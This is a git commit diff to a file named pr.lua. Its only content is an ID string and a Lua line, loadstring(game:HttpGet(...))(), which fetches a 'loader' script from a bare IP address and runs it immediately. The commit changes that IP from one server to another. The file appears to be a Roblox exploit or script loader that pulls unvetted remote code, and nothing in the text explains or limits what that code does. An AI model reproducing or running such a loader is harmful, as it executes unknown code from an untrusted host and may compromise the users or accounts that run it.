d4f0b49b38f9b0dabaa9fb70ebccd163e5176fd5
Mathersg4 <156609158+Mathersg4@users.noreply.github.com>
2025-08-30 15:47:49 +0300

    Update pr.lua

--- pr.lua
+++ pr.lua
@@ -1,2 +1,2 @@
 ID="7d02e215-29aa-4d4b-8d74-95e8893eacf0";
-loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
